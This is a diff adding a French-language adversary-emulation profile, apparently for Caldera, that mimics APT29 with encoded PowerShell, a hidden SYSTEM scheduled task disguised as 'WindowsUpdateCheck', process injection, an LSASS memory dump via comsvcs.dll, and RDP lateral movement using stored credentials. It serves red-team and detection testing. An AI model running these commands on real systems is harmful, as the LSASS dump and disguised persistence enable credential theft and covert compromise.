@@ -1,0 +1,81 @@
+id: ffe6dcaa-c6d0-4826-b174-c2eef561b0e7
+name: apt29-energy-2026
+description: Sous-ensemble PoC du profil APT29 : execution, persistance, injection, dump LSASS, mouvement lateral RDP, exfiltration via canal C2
+objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
+atomic_ordering:
+- 8cb64f4c-f6ce-4b92-ab6e-a7de0d934136
+- 873310f1-5e84-45ae-bcc9-9552916fe8aa
+- a34012fc-f8cf-4090-8cb3-8c1e5d5e80b1
+- 10a5aa35-7908-4b90-b2f2-3a4d6169989a
+- db1ccb1d-6ce1-4236-aff7-1498b2cfa396
+- 9606bedf-39f3-4885-9e87-55592c89c897
+abilities:
+ 8cb64f4c-f6ce-4b92-ab6e-a7de0d934136:
+  name:  Execution PowerShell encodee (APT29)
+  tactic:  execution
+  technique_name:  "Command and Scripting Interpreter: PowerShell"
+  technique_id:  T1059.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $cmd = 'Write-Host "APT29-emulation: execution PowerShell confirmee"; whoami; hostname'
+       $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+       $enc = [Convert]::ToBase64String($bytes)
+       powershell.exe -NoProfile -EncodedCommand $enc
+ 873310f1-5e84-45ae-bcc9-9552916fe8aa:
+  name:  Persistance via tache planifiee (APT29)
+  tactic:  persistence
+  technique_name:  "Scheduled Task/Job: Scheduled Task"
+  technique_id:  T1053.005
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       schtasks /create /tn "WindowsUpdateCheck" /tr "powershell.exe -NoProfile -WindowStyle Hidden -Command Write-Host 'apt29-persistence-poc'" /sc onlogon /ru SYSTEM /f
+ a34012fc-f8cf-4090-8cb3-8c1e5d5e80b1:
+  name:  Process injection dans un processus legitime (APT29)
+  tactic:  defense-evasion
+  technique_name:  "Process Injection"
+  technique_id:  T1055
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       Start-Process notepad.exe -WindowStyle Hidden
+       Start-Sleep -Seconds 2
+       Invoke-AtomicTest T1055 -TestNumbers 1
+ 10a5aa35-7908-4b90-b2f2-3a4d6169989a:
+  name:  Dump memoire LSASS via comsvcs.dll (APT29)
+  tactic:  credential-access
+  technique_name:  "OS Credential Dumping: LSASS Memory"
+  technique_id:  T1003.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       $procId = (Get-Process lsass).Id
+       rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $procId C:\Windows\Temp\lsass_poc.dmp full
+ db1ccb1d-6ce1-4236-aff7-1498b2cfa396:
+  name:  Deplacement lateral via RDP (APT29)
+  tactic:  lateral-movement
+  technique_name:  "Remote Services: Remote Desktop Protocol"
+  technique_id:  T1021.001
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       cmdkey /generic:TERMSRV/#{lateral.target_dc} /user:#{lateral.username} /pass:#{lateral.password}
+       mstsc.exe /v:#{lateral.target_dc} /f
+ 9606bedf-39f3-4885-9e87-55592c89c897:
+  name:  Exfiltration via canal C2 sandcat (APT29)
+  tactic:  exfiltration
+  technique_name:  "Exfiltration Over C2 Channel"
+  technique_id:  T1041
+  executors: 
+   - psh:
+     platform: windows
+     command: |
+       "Rapport de test APT29-energy-2026 - exfiltration PoC" | Out-File C:\Windows\Temp\poc_report.txt
+       $data = Get-Content C:\Windows\Temp\poc_report.txt -Raw
+       Write-Host $data
